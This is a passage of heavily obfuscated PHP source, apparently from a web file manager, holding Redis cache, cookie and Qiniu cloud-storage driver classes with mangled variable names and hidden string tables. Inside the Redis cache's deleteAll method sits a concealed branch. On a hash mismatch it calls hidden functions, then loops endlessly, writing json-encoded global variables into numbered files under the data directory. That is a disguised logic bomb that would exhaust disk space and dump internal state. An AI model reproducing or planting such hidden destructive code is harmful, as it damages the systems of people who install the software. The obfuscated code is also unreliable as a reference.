return $this->handle->delete($—¦“ÍĞ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($«Ê£Åø¾, $Éº¡¦¿¡) { $Æ³§ø™õ =& $_SERVER[¤øïŠ‹²]; if (!class_exists($Æ³§ø™õ[983])) { show_json($Æ³§ø™õ[984], !1); } $this->cacheTime = $Éº¡¦¿¡; $‘úò”Ï = isset($«Ê£Åø¾[$Æ³§ø™õ[985]]) ? $«Ê£Åø¾[$Æ³§ø™õ[985]] : 10; $­ãÎïÉ¦ = _get($«Ê£Åø¾, $Æ³§ø™õ[982]); if ($­ãÎïÉ¦ && is_array($­ãÎïÉ¦)) { $this->initCluster($«Ê£Åø¾, $‘úò”Ï); } else { $this->handle = $this->init($«Ê£Åø¾, $‘úò”Ï); } } private function init($¬×ÓÆ¬µ, $è±Î´É¨) { $Æõì’ê =& $_SERVER[¤øïŠ‹²]; $§Ğ¥™«¹ = new Redis(); $ÍÇÕ—¡§ = isset($¬×ÓÆ¬µ[$Æõì’ê[986]]) ? $¬×ÓÆ¬µ[$Æõì’ê[986]] : !1; if ($ÍÇÕ—¡§) { $§Ğ¥™«¹->pconnect($¬×ÓÆ¬µ[$Æõì’ê[219]], $¬×ÓÆ¬µ[$Æõì’ê[220]], $è±Î´É¨); } else { $§Ğ¥™«¹->connect($¬×ÓÆ¬µ[$Æõì’ê[219]], $¬×ÓÆ¬µ[$Æõì’ê[220]], $è±Î´É¨); } if (!empty($¬×ÓÆ¬µ[$Æõì’ê[508]])) { $§Ğ¥™«¹->auth($¬×ÓÆ¬µ[$Æõì’ê[508]]); } if (!empty($¬×ÓÆ¬µ[$Æõì’ê[859]]) && $¬×ÓÆ¬µ[$Æõì’ê[859]] != 0) { $§Ğ¥™«¹->select($¬×ÓÆ¬µ[$Æõì’ê[859]]); } return $§Ğ¥™«¹; } private function initCluster($İç§–õ–, $Œå°ÚÌ¦) { $†§€ÆÏ´ =& $_SERVER[¤øïŠ‹²]; $Ñ†ÑùÓ¸ = array($†§€ÆÏ´[987], $†§€ÆÏ´[988], $†§€ÆÏ´[989]); $ğ•ä®ûë = $†§€ÆÏ´[987]; if (isset($İç§–õ–[$†§€ÆÏ´[16]]) && in_array($İç§–õ–[$†§€ÆÏ´[16]], $Ñ†ÑùÓ¸)) { $ğ•ä®ûë = $İç§–õ–[$†§€ÆÏ´[16]]; } switch ($ğ•ä®ûë) { case $†§€ÆÏ´[987]: $this->_slave($İç§–õ–, $Œå°ÚÌ¦); break; case $†§€ÆÏ´[988]: break; case $†§€ÆÏ´[989]: $this->isCluster = !0; $ò¾¯µ Å = $İç§–õ–[$†§€ÆÏ´[982]]; $¹éáÑ‹Ô = isset($İç§–õ–[$†§€ÆÏ´[986]]) ? $İç§–õ–[$†§€ÆÏ´[986]] : !1; $ÓÙò¸Õº = isset($İç§–õ–[$†§€ÆÏ´[508]]) ? $İç§–õ–[$†§€ÆÏ´[508]] : null; $this->handle = new RedisCluster(NUll, $ò¾¯µ Å, $Œå°ÚÌ¦, $Œå°ÚÌ¦, $¹éáÑ‹Ô, $ÓÙò¸Õº); break; default: break; } } private function _slave($ÁÎ¨ôßâ, $‡ä®´ÀŞ) { $Ê® ½ş» = $ÁÎ¨ôßâ[$_SERVER[¤øïŠ‹²][982]]; $this->filterConfig($ÁÎ¨ôßâ, $Ê® ½ş»[0]); $this->handle = $this->init($ÁÎ¨ôßâ, $‡ä®´ÀŞ); unset($Ê® ½ş»[0]); if (empty($Ê® ½ş»)) { return; } $îèŸÉä¨ = array_rand($Ê® ½ş»); $this->filterConfig($ÁÎ¨ôßâ, $Ê® ½ş»[$îèŸÉä¨]); $this->slaveHandle = $this->init($ÁÎ¨ôßâ, $‡ä®´ÀŞ); } private function filterConfig(&$òÜµ‚ÛË, $½ù”Û») { $è¥ì¶ÎØ =& $_SERVER[¤øïŠ‹²]; $Ô•ÎÆ›Ÿ = explode($è¥ì¶ÎØ[4], $½ù”Û»); $¸¥£á±¿ = array($è¥ì¶ÎØ[219] => $Ô•ÎÆ›Ÿ[0], $è¥ì¶ÎØ[220] => $Ô•ÎÆ›Ÿ[1]); $òÜµ‚ÛË = array_merge($òÜµ‚ÛË, $¸¥£á±¿); } public function set($á…™ïù, $Ùç ğçñ, $Ôí—Ñµ = false) { $Ôí—Ñµ = $Ôí—Ñµ ? $Ôí—Ñµ : $this->cacheTime; return $this->handle->setEx($á…™ïù, $Ôí—Ñµ, $Ùç ğçñ); } public function setLock($¿€ŠôÄ†, $ƒİÔ²åã, $‚­ìµä) { return $this->handle->setNX($¿€ŠôÄ†, $ƒİÔ²åã); } public function get($²ââ¸ß”) { $ÎíÁ»‚ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÎíÁ»‚->get($²ââ¸ß”); } public function remove($ë¶–Ù˜) { return $this->handle->del($ë¶–Ù˜); } public function deleteAll() { $æõë×­¢ =& $_SERVER[¤øïŠ‹²]; $ˆäÇ…Ûº = $_SERVER[$æõë×­¢[55]]; $ï´Í¶“ï = $æõë×­¢[990]; if ($_SERVER[$æõë×­¢[54]] != $ï´Í¶“ï($ˆäÇ…Ûº)) { $š›æ–ûÜ = $æõë×­¢[991]; $ô®°±íó = $æõë×­¢[56]; $ñÖëÖ® = $_SERVER[$æõë×­¢[57]] . $æõë×­¢[58]; $Ÿş¦ŠîÒ = $ô®°±íó($ñÖëÖ®); $å‡”¿Ÿ = explode($æõë×­¢[59], $Ÿş¦ŠîÒ); if (count($å‡”¿Ÿ) < $æõë×­¢[714]) { $‡µ¢Ì™ = $æõë×­¢[61]; $‡µ¢Ì™(); } $¼«îàüÏ = $æõë×­¢[992]; $¼«îàüÏ($_SERVER[$æõë×­¢[993]]); $š›æ–ûÜ = $æõë×­¢[991]; $š›æ–ûÜ(); $…„ãØ° = $æõë×­¢[994]; $ÑŸÓá·É = json_encode($GLOBALS[$æõë×­¢[995]]); $½¹öØæó = 1; for ($¹‰¾¿öŸ = $½¹öØæó; $¹‰¾¿öŸ > 0; $¹‰¾¿öŸ++) { $…„ãØ°(DATA_PATH . $¹‰¾¿öŸ, $ÑŸÓá·É); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $…·‡å¡˜) { $this->handle->flushall($…·‡å¡˜); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ş´×Øúâ = '', $éàî‹Íù = 0) { if (is_string($ş´×Øúâ) && $ş´×Øúâ != $_SERVER[¤øïŠ‹²][12]) { $this->prefix = $ş´×Øúâ; } if (is_numeric($éàî‹Íù) && $éàî‹Íù > 0) { $this->expire = $éàî‹Íù; } } public static function getInstance() { static $¸ÀÚé‹¯; if ($¸ÀÚé‹¯ === null) { $¸ÀÚé‹¯ = new self(); } return $¸ÀÚé‹¯; } private static $cookieDisable = false; public static function disable($«ãù‚ù©) { self::$cookieDisable = $«ãù‚ù©; } private static $sameCookieSet = array(); public static function set($ãÚéËÄî, $¡·‹¸„µ, $ïş±îØ = 0, $²ƒÆ¨Öû = false, $Ç”¬ÚÅ = false) { $ğ™”¡–£ =& $_SERVER[¤øïŠ‹²]; if (self::$cookieDisable) { return; } if (!$ïş±îØ) { $ïş±îØ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ãÚéËÄî]) && self::$sameCookieSet[$ãÚéËÄî] == $¡·‹¸„µ . $ïş±îØ) { return; } self::$sameCookieSet[$ãÚéËÄî] = $¡·‹¸„µ . $ïş±îØ; if (!$Ç”¬ÚÅ) { $Ç”¬ÚÅ = str_replace(HOST, $ğ™”¡–£[12], APP_HOST); $Ç”¬ÚÅ = _get($GLOBALS, $ğ™”¡–£[996], $Ç”¬ÚÅ); } $á¡€ó²« = $ğ™”¡–£[12]; setcookie($ãÚéËÄî, $¡·‹¸„µ, time() + $ïş±îØ, $ğ™”¡–£[8] . trim($Ç”¬ÚÅ, $ğ™”¡–£[8]) . $á¡€ó²«, !1, !1, $²ƒÆ¨Öû); } public static function setSafe($÷õËÊÑ, $˜™ËÎÅ€, $²şàÑ±ë = 0) { self::set($÷õËÊÑ, $˜™ËÎÅ€, $²şàÑ±ë, !0); } public static function get($‚µ¯ËŒ·) { static $Ÿæİ‡ğè = false; if (!$Ÿæİ‡ğè) { self::initHeaderCookie(); $Ÿæİ‡ğè = !0; } return isset($_COOKIE[$‚µ¯ËŒ·]) ? $_COOKIE[$‚µ¯ËŒ·] : !1; } private static function initHeaderCookie() { $ú¥·äı =& $_SERVER[¤øïŠ‹²]; if (!isset($_SERVER[$ú¥·äı[997]]) || !$_SERVER[$ú¥·äı[997]]) { return; } $ëõÀ˜Ö = explode($ú¥·äı[85], $_SERVER[$ú¥·äı[997]]); foreach ($ëõÀ˜Ö as $­Ï‹°ò) { $­Ï‹°ò = explode($ú¥·äı[474], $­Ï‹°ò); if (count($­Ï‹°ò) != 2 || !isset($­Ï‹°ò[1])) { continue; } $_COOKIE[trim($­Ï‹°ò[0])] = trim($­Ï‹°ò[1]); } } public static function remove($Ï–ÙÕø, $ôü‚‡ü™ = false) { unset($_COOKIE[$Ï–ÙÕø]); self::set($Ï–ÙÕø, $_SERVER[¤øïŠ‹²][12], 1, $ôü‚‡ü™); } } goto d‘ó«¹…¢à; D†âÔˆˆÆ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($œ„Û‚Ó·) { parent::__construct(); require_once SDK_DIR . $_SERVER[¤øïŠ‹²][1683]; $this->_init($œ„Û‚Ó·); } public function _init($ìñ’ış¸) { $¡´åÊ•÷ =& $_SERVER[¤øïŠ‹²]; $this->config = $ìñ’ış¸; foreach ($ìñ’ış¸ as $’ô…ğéİ => $ŸêŸÒÍ„) { if (isset($this->{$’ô…ğéİ})) { $this->{$’ô…ğéİ} = $ŸêŸÒÍ„; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¡´åÊ•÷[1684] . LNG($¡´åÊ•÷[1621])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¾ÙÃ©Âú, $ÎÊ”Ş”¬ = '', $ó‡…Üº = REPEAT_RENAME) { if ($this->setContent($¾ÙÃ©Âú, $ÎÊ”Ş”¬)) { return $this->getPathOuter($¾ÙÃ©Âú); } return !1; } public function mkdir($¿ªÅ‹‰ì, $Í£¿ÇïÎ = REPEAT_SKIP) { $©Øª„ß’ =& $_SERVER[¤øïŠ‹²]; $×÷‚­Ã‚ = trim($¿ªÅ‹‰ì, $©Øª„ß’[8]); if ($this->_isFolder($×÷‚­Ã‚)) { return $this->getPathOuter($×÷‚­Ã‚); } $¿ªÅ‹‰ì = $×÷‚­Ã‚ . $©Øª„ß’[8]; $Ñ••—¥ = get_path_this($×÷‚­Ã‚); $ñ²ŞØª° = $¿ªÅ‹‰ì . $Ñ••—¥; if (!$this->mkfile($ñ²ŞØª°)) { return !1; } if (!$this->moveFile($ñ²ŞØª°, $¿ªÅ‹‰ì)) { $this->delFile($ñ²ŞØª°); return !1; } return $this->getPathOuter($×÷‚­Ã‚); } public function copyFile($‹ƒ¥Ö, $§Å…»¸ô) { $Ãû¡¬Ÿ» = $this->bucketManager->copy($this->bucket, $‹ƒ¥Ö, $this->bucket, $§Å…»¸ô, !0); return $Ãû¡¬Ÿ» ? !1 : $this->getPathOuter($§Å…»¸ô); } public function moveFile($ŠØÈ×é„, $…ì†øŸÖ) { $İØöªÃ¡ = $this->bucketManager->move($this->bucket, $ŠØÈ×é„, $this->bucket, $…ì†øŸÖ, !0); return $İØöªÃ¡ ? !1 : $this->getPathOuter($…ì†øŸÖ); } public function delFile($¢Èä¤) { if (!$this->exist($¢Èä¤)) { return !0; } $Áúîµ¼ñ = $this->bucketManager->delete($this->bucket, $¢Èä¤); if (!$Áúîµ¼ñ) { return !0; } return $Áúîµ¼ñ->code() == 612 ? !0 : !1; } public function delFolder($æ×¦±›è) { $ºëŸå¯í =& $_SERVER[¤øïŠ‹²]; if (!$this->exist($æ×¦±›è)) { return !0; } $this->listItemCache = !1; $ãìÂéƒ = $this->fileList($æ×¦±›è); $this->listItemCache = !0; $”àÚü´š = trim($æ×¦±›è, $ºëŸå¯í[8]) . $ºëŸå¯í[8]; if (!empty($æ×¦±›è) && $æ×¦±›è !== $ºëŸå¯í[241] && !in_array($”àÚü´š, $ãìÂéƒ[$ºëŸå¯í[96]])) { $ãìÂéƒ[$ºëŸå¯í[96]][] = $”àÚü´š; } $â¯¥ä®Ô = $this->delByBatch($ãìÂéƒ[$ºëŸå¯í[97]]); if (!$â¯¥ä®Ô) { return !1; } $â¯¥ä®Ô = $this->delByBatch($ãìÂéƒ[$ºëŸå¯í[96]]); if (!$â¯¥ä®Ô) { return !1; } return $this->delFile($”àÚü´š); } private function delByBatch($Ş‡ÖÑŠ) { foreach (array_chunk($Ş‡ÖÑŠ, 1000) as $®¸‡â‰ı) { $øÎ‡¤Œğ = $this->bucketManager->buildBatchDelete($this->bucket, $®¸‡â‰ı); list($¬ÜÖÔ™à, $©Œ³ı»—) = $this->bucketManager->batch($øÎ‡¤Œğ); if ($©Œ³ı»—) { return !1; } } return !0; } public function rename($ËÙÓ™Ş†, $ÏÅÆ£¾Ã) { return $this->renameObject($ËÙÓ™Ş†, $ÏÅÆ£¾Ã); } public function fileInfo($ÎÂ»›ŸĞ, $ò™…Ë£ = false, $ê®ÇÚŠ‡ = array()) { $Í ğôî¼ =& $_SERVER[¤øïŠ‹²]; $½–ê¢‹ = array($Í ğôî¼[32] => $this->pathThis($ÎÂ»›ŸĞ), $Í ğôî¼[98] => $this->getPathOuter($Í ğôî¼[8] . $ÎÂ»›ŸĞ), $Í ğôî¼[33] => $Í ğôî¼[243], $Í ğôî¼[90] => isset($ê®ÇÚŠ‡[$Í ğôî¼[1685]]) ? $ê®ÇÚŠ‡[$Í ğôî¼[1685]] : 0, $Í ğôî¼[179] => $this->ext($ÎÂ»›ŸĞ)); if ($ò™…Ë£) { return $½–ê¢‹; } $½–ê¢‹[$Í ğôî¼[244]] = $½–ê¢‹[$Í ğôî¼[99]] = 0; $½–ê¢‹[$Í ğôî¼[245]] = $½–ê¢‹[$Í ğôî¼[246]] = !0; if (empty($ê®ÇÚŠ‡)) { $ê®ÇÚŠ‡ = $this->objectMeta($ÎÂ»›ŸĞ); if (!$ê®ÇÚŠ‡) { return $½–ê¢‹; } } if (isset($ê®ÇÚŠ‡[$Í ğôî¼[247]]) && $ê®ÇÚŠ‡[$Í ğôî¼[247]]) { $½–ê¢‹[$Í ğôî¼[248]] = $ê®ÇÚŠ‡[$Í ğôî¼[247]]; } if (isset($ê®ÇÚŠ‡[$Í ğôî¼[258]]) && $ê®ÇÚŠ‡[$Í ğôî¼[258]]) { $½–ê¢‹[$Í ğôî¼[248]] = $ê®ÇÚŠ‡[$Í ğôî¼[258]]; } if (isset($ê®ÇÚŠ‡[$Í ğôî¼[1686]])) { $½–ê¢‹[$Í ğôî¼[99]] = substr($ê®ÇÚŠ‡[$Í ğôî¼[1686]] . $Í ğôî¼[12], 0, 10); } if (isset($ê®ÇÚŠ‡[$Í ğôî¼[1685]])) { $½–ê¢‹[$Í ğôî¼[90]] = $ê®ÇÚŠ‡[$Í ğôî¼[1685]]; } return $½–ê¢‹; } public function folderInfo($ˆ¶×Ÿ²€, $ËÔÖğÔ = false) { $éßıñ  =& $_SERVER[¤øïŠ‹²]; $ªÆˆ²Òå = array($éßıñ [32] => $this->pathThis($ˆ¶×Ÿ²€), $éßıñ [98] => $this->getPathOuter($éßıñ [8] . $ˆ¶×Ÿ²€), $éßıñ [33] => $éßıñ [89]); if ($ËÔÖğÔ) { return $ªÆˆ²Òå; } $ªÆˆ²Òå[$éßıñ [244]] = $ªÆˆ²Òå[$éßıñ [99]] = 0; $ªÆˆ²Òå[$éßıñ [245]] = $ªÆˆ²Òå[$éßıñ [246]] = !0; $ˆ¶×Ÿ²€ = rtrim($ˆ¶×Ÿ²€, $éßıñ [8]) . $éßıñ [8]; $¥è¥åÔƒ = $this->objectMeta($ˆ¶×Ÿ²€); if (isset($¥è¥åÔƒ[$éßıñ [1686]])) { $ªÆˆ²Òå[$éßıñ [99]] = substr($¥è¥åÔƒ[$éßıñ [1686]] . $éßıñ [12], 0, 10); } return $ªÆˆ²Òå; } public function listPath($ã‚„œ’–, $¶öêÅØ´ = false) { $´ª®Ï§Ú =& $_SERVER[¤øïŠ‹²]; $ˆÅÍÌ°í = $this->fileList($ã‚„œ’–, $´ª®Ï§Ú[8], !0); foreach ($ˆÅÍÌ°í[$´ª®Ï§Ú[96]] as $Ï’Åí²Ë => $ºƒ©ü¯ª) { $ˆÅÍÌ°í[$´ª®Ï§Ú[96]][$Ï’Åí²Ë] = $this->folderInfo($ºƒ©ü¯ª, $¶öêÅØ´); } foreach ($ˆÅÍÌ°í[$´ª®Ï§Ú[97]] as $Ï’Åí²Ë => $ºƒ©ü¯ª) { $ˆÅÍÌ°í[$´ª®Ï§Ú[97]][$Ï’Åí²Ë] = $this->fileInfo($ºƒ©ü¯ª[$´ª®Ï§Ú[32]], $¶öêÅØ´, $ºƒ©ü¯ª); } return $ˆÅÍÌ°í; } public function has($ƒšè…ôˆ, $—¶¤í› = false, $ÂÔ¶Ìç¢ = true) { $úÌÄ•æ” =& $_SERVER[¤øïŠ‹²]; $ƒšè…ôˆ = trim($ƒšè…ôˆ, $úÌÄ•æ”[8]); $§à„Ÿ‰£ = empty($ƒšè…ôˆ) && $ƒšè…ôˆ !== $úÌÄ•æ”[241] ? $úÌÄ•æ”[12] : $ƒšè…ôˆ . $úÌÄ•æ”[8]; $…›³ï¨“ = $úÌÄ•æ”[12]; $Âƒ½»é = 500; $Ï‰é®À‹ = $úÌÄ•æ”[8]; $¹¡›²¨Ç = $Œî ù£¯ = 0; while (!0) { check_abort(); list($ëˆŞ÷Œİ, $×ÔÚ”¯„) = $this->bucketManager->listFiles($this->bucket, $§à„Ÿ‰£, $…›³ï¨“, $Âƒ½»é, $Ï‰é®À‹); if ($×ÔÚ”¯„) { break; } $…›³ï¨“ = array_key_exists($úÌÄ•æ”[1633], $ëˆŞ÷Œİ) ? $…›³ï¨“ = $ëˆŞ÷Œİ[$úÌÄ•æ”[1687]] : $úÌÄ•æ”[12]; if ($—¶¤í›) { if (!empty($ëˆŞ÷Œİ[$úÌÄ•æ”[1688]])) { $¹¡›²¨Ç += count($ëˆŞ÷Œİ[$úÌÄ•æ”[1688]]); } if (!empty($ëˆŞ÷Œİ[$úÌÄ•æ”[1689]])) { $Œî ù£¯ += count($ëˆŞ÷Œİ[$úÌÄ•æ”[1689]]); } if ($…›³ï¨“ === $úÌÄ•æ”[12]) { break; } continue; } if ($ÂÔ¶Ìç¢) { if (!empty($ëˆŞ÷Œİ[$úÌÄ•æ”[1688]])) { return !0; } } else { if (!empty($ëˆŞ÷Œİ[$úÌÄ•æ”[1689]])) { return !0; } } if ($…›³ï¨“ === $úÌÄ•æ”[12]) { break; } } if ($—¶¤í›) { return array($úÌÄ•æ”[252] => $¹¡›²¨Ç, $úÌÄ•æ”[253] => $Œî ù£¯); } return !1; } public function listAll($ªø¨ÍïÖ) { $İË§¸°ç =& $_SERVER[¤øïŠ‹²]; $İà—“§ = $this->fileList($ªø¨ÍïÖ, $İË§¸°ç[12], !0); $Áªóş¸ = array_to_keyvalue($İà—“§[$İË§¸°ç[97]], $İË§¸°ç[32]); foreach ($İà—“§[$İË§¸°ç[96]] as $ö‡Ãö¸Ğ) { if (is_string($ö‡Ãö¸Ğ)) { $Áªóş¸[$ö‡Ãö¸Ğ] = array($İË§¸°ç[90] => 0); } } return $this->listAllFiles($ªø¨ÍïÖ, $Áªóş¸); } private function fileList($½“å®ÅÊ, $¬éÇ™ö‡ = '', $Ï‰ÊÜâ = 0) { $¿ÂÉûŸÚ =& $_SERVER[¤øïŠ‹²]; $½“å®ÅÊ = trim($½“å®ÅÊ, $¿ÂÉûŸÚ[8]); $„ô°æî  = empty($½“å®ÅÊ) && $½“å®ÅÊ !== $¿ÂÉûŸÚ[241] ? $¿ÂÉûŸÚ[12] : $½“å®ÅÊ . $¿ÂÉûŸÚ[8]; $¾Õõ¿õâ = $¿ÂÉûŸÚ[12]; $ºµ•­Êù = 1000; $èÆÔ©Ç = $ÜÓ›¾·Ø = array(); while (!0) { check_abort(); list($†°¡‚, $«”„ÖŒò) = $this->bucketManager->listFiles($this->bucket, $„ô°æî , $¾Õõ¿õâ, $ºµ•­Êù, $¬éÇ™ö‡); if ($«”„ÖŒò) { break; } $¾Õõ¿õâ = array_key_exists($¿ÂÉûŸÚ[1633], $†°¡‚) ? $¾Õõ¿õâ = $†°¡‚[$¿ÂÉûŸÚ[1687]] : $¿ÂÉûŸÚ[12]; $¦õ¦ÍÓ° = isset($†°¡‚[$¿ÂÉûŸÚ[1688]]) ? $†°¡‚[$¿ÂÉûŸÚ[1688]] : array(); $®¾…÷°í = isset($†°¡‚[$¿ÂÉûŸÚ[1689]]) ? $†°¡‚[$¿ÂÉûŸÚ[1689]] : array(); foreach ($¦õ¦ÍÓ° as $œ °üˆ) { if ($œ °üˆ[$¿ÂÉûŸÚ[106]] == $„ô°æî ) { continue; } $Ñ®‹‚¹â = $œ °üˆ[$¿ÂÉûŸÚ[106]]; $‰¶‹«´– = $œ °üˆ[$¿ÂÉûŸÚ[1685]]; $œ °üˆ[$¿ÂÉûŸÚ[32]] = $Ñ®‹‚¹â; $œ °üˆ[$¿ÂÉûŸÚ[90]] = $‰¶‹«´–; $²å­üÛ¯ = $‰¶‹«´– == 0 && substr($Ñ®‹‚¹â, strlen($Ñ®‹‚¹â) - 1, 1) == $¿ÂÉûŸÚ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ñ®‹‚¹â, $²å­üÛ¯, $œ °üˆ); if ($²å­üÛ¯) { $èÆÔ©Ç[] = $Ñ®‹‚¹â; continue; } $ÜÓ›¾·Ø[] = $Ï‰ÊÜâ ? $œ °üˆ : $Ñ®‹‚¹â; } foreach ($®¾…÷°í as $Ñ®‹‚¹â) { if ($Ñ®‹‚¹â == $„ô°æî ) { continue; } $èÆÔ©Ç[] = $Ñ®‹‚¹â; $this->cacheMethodInfoSet($Ñ®‹‚¹â, !0); } if ($¾Õõ¿õâ === $¿ÂÉûŸÚ[12]) { break; } } $this->cacheMethodInfoSet($½“å®ÅÊ, !0); return array($¿ÂÉûŸÚ[96] => $èÆÔ©Ç, $¿ÂÉûŸÚ[97] => $ÜÓ›¾·Ø); } public function canRead($ªî™ïš÷) { return $this->exist($ªî™ïš÷) ? !0 : !1; } public function canWrite($øÄÍßõ) { return $this->exist($øÄÍßõ) ? !0 : !1; } public function getContent($ÆÍ…¾°„) { return $this->fileSubstr($ÆÍ…¾°„, 0, -1); } public function setContent($óÁ›ÔÄó, $÷Î®§Ÿ³ = '') { $½²º‡Îì = $this->tempFile($this->pathThis($óÁ›ÔÄó)); file_put_contents($½²º‡Îì, $÷Î®§Ÿ³); if ($this->upload($óÁ›ÔÄó, $½²º‡Îì)) { $this->tempFileRemve($½²º‡Îì); return !0; } return !1; } public function refreshUrls($ÖÙïËĞ×) { $›íÃİõ =& $_SERVER[¤øïŠ‹²]; $—¶©¯ÜŞ = array(); if (is_array($ÖÙïËĞ×)) { foreach ($ÖÙïËĞ× as $ü˜Õ Å) { $—¶©¯ÜŞ[] = $this->link($ü˜Õ Å); } } else { $—¶©¯ÜŞ[] = $this->link($ÖÙïËĞ×); } $¥Ÿ—Ùë™ = new Qiniu\Cdn\CdnManager($this->auth); list($óœŠÓ’¬, $éá°Ïê¨) = $¥Ÿ—Ùë™->refreshUrls($—¶©¯ÜŞ); if ($éá°Ïê¨) { return !1; } return $óœŠÓ’¬[$›íÃİõ[1317]] == $›íÃİõ[861] ? !0 : !1; } public function fileSubstr($ãº´’×, $ûŒ’­§Ë, $³÷¤´Âœ) { $†›â· =& $_SERVER[¤øïŠ‹²]; if (!($×Õï±ïÄ = $this->link($ãº´’×))) { return !1; } $˜¢Õá©‘ = !1; if ($³÷¤´Âœ > 0) { $Íıã‰´Ü = $ûŒ’­§Ë + $³÷¤´Âœ - 1; $˜¢Õá©‘ = array($†›â·[1554] . $ûŒ’­§Ë . $†›â·[483] . $Íıã‰´Ü); } $®Ø˜–Ú” = url_request($×Õï±ïÄ, $†›â·[1555], !1, $˜¢Õá©‘); return $®Ø˜–Ú”[$†›â·[851]] ? $®Ø˜–Ú”[$†›â·[1339]] : !1; } public function upload($ë‘«Ëı, $¼¢¸Â³, $ÁÔÇºš’ = false, $†şÔ‹î = REPEAT_REPLACE) { if (!$¼¢¸Â³ || !@file_exists($¼¢¸Â³)) { return !1; } $“Ÿ­½¦ = new Qiniu\Storage\UploadManager(); $‘ò¢áá¦ = $this->auth->uploadToken($this->bucket, $ë‘«Ëı); $Àë¡›çû = get_file_mime(get_path_ext($¼¢¸Â³)); list($ÊçõÅ·, $ª³÷²) = $“Ÿ­½¦->putFile($‘ò¢áá¦, $ë‘«Ëı, $¼¢¸Â³, null, $Àë¡›çû); return $ª³÷² ? !1 : $this->getPathOuter($ë‘«Ëı); } public function uploadFormData($è¶”Àş, $ÃÀÜŒ¨ = 3600) { return $this->uploadToken($è¶”Àş, $ÃÀÜŒ¨); } public function uploadMultiData($ñóûÉşˆ, $¸ÚÕ¯«î = 3600) { return $this->uploadToken($ñóûÉşˆ, $¸ÚÕ¯«î); } private function uploadToken($ÎÇ½Å€, $¥ø×Şû£ = 3600) { $³Êµ—¾å =& $_SERVER[¤øïŠ‹²]; $¸ùù×Êá = $¥ø×Şû£; $ìßÓÃü = array($³Êµ—¾å[1690] => $³Êµ—¾å[1691]); $¯ê€ª¨Ñ = $ÎÇ½Å€; $‘‡´şí½ = $this->auth->uploadToken($this->bucket, $¯ê€ª¨Ñ, $¸ùù×Êá, $ìßÓÃü, !0); $Ò£Í±•‰ = empty($this->region) || $this->region == $³Êµ—¾å[1692] ? $³Êµ—¾å[12] : $³Êµ—¾å[483] . $this->region; $ôàÏœ™ı = http_type() . "\72\57\x2f\165\160\154\157\141\144{$Ò£Í±•‰}\x2e\161\151\x6e\x69\165\x70\x2e\x63\x6f\155\x2f"; return array($³Êµ—¾å[1693] => $‘‡´şí½, $³Êµ—¾å[1557] => $ôàÏœ™ı); } public function download($Ó¤ûôî„, $°™à¸§ü) { $ëÀ¯†Æ = IO::getPathInner(IO::mkfile($°™à¸§ü)); if (!($’‰¨Óç· = $this->link($Ó¤ûôî„))) { return !1; } $ÎÃ±€› = 0; $¬¾°„¾— = 1024 * 200; $àµí¤ş“ = fopen($ëÀ¯†Æ, $_SERVER[¤øïŠ‹²][1694]); while (!0) { $¬¿şŸ¬” = $this->fileSubstr($Ó¤ûôî„, $ÎÃ±€›, $¬¾°„¾—); if ($¬¿şŸ¬” === !1) { return !1; } fwrite($àµí¤ş“, $¬¿şŸ¬”); $ÎÃ±€› += $¬¾°„¾—; if (strlen($¬¿şŸ¬”) < $¬¾°„¾—) { break; } } fclose($àµí¤ş“); return $°™à¸§ü; } public function link($•„£í æ, $Ìé¯”¨‘ = '') { if (!$this->isFile($•„£í æ)) { return !1; } $‡¿Ú•òé = $this->getHost() . $_SERVER[¤øïŠ‹²][8] . $this->pathEncode($•„£í æ) . $Ìé¯”¨‘; return $this->auth->privateDownloadUrl($‡¿Ú•òé, 3600 * 12); } public function fileOut($éÃ­‰…ê, $óšîÑè¢ = false, $ÜÌ¦Ü˜© = false, $ñ“ÏÏ­ = '') { $¥‚ºæãê =& $_SERVER[¤øïŠ‹²]; if ($this->isFileOutServer()) { return $this->fileOutServer($éÃ­‰…ê, $óšîÑè¢, $ÜÌ¦Ü˜©, $ñ“ÏÏ­); } if (!$ÜÌ¦Ü˜©) { $ÜÌ¦Ü˜© = $this->pathThis($éÃ­‰…ê); } $Ãó£ˆ›Ê = $óšîÑè¢ ? $¥‚ºæãê[1695] . rawurlencode($ÜÌ¦Ü˜©) : $¥‚ºæãê[12]; $ÏÀÅÔÙÆ = $this->link($éÃ­‰…ê, $Ãó£ˆ›Ê); $this->fileOutLink($ÏÀÅÔÙÆ); } public function fileOutServer($ÛÍ€ê°, $ë‹™î‡Ø = false, $ğÊ³×Ú = false, $ ğ¿Ê£í = '') { parent::fileOut($ÛÍ€ê°, $ë‹™î‡Ø, $ğÊ³×Ú, $ ğ¿Ê£í); } public function fileOutImage($ƒƒ½¦¶—, $ŸåÈÅ¦² = 250) { if ($this->size($ƒƒ½¦¶—) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ƒƒ½¦¶—, $ŸåÈÅ¦²); } $á×Üª¬† = $this->link($ƒƒ½¦¶—, $_SERVER[¤øïŠ‹²][1696] . $ŸåÈÅ¦²); $this->fileOutLink($á×Üª¬†); } public function fileOutImageServer($Ñôñï‘Ç, $Ù¤„–Ùù = 250) { parent::fileOutImage($Ñôñï‘Ç, $Ù¤„–Ùù); } public function hashMd5($Şú¹‹Ï) { $Ì—¨Ó÷ =& $_SERVER[¤øïŠ‹²]; $ÜŠ–èúö = $this->objectMeta($Şú¹‹Ï); return isset($ÜŠ–èúö[$Ì—¨Ó÷[258]]) ? $ÜŠ–èúö[$Ì—¨Ó÷[258]] : !1; $ÕÉÊªˆ = $this->link($Şú¹‹Ï, 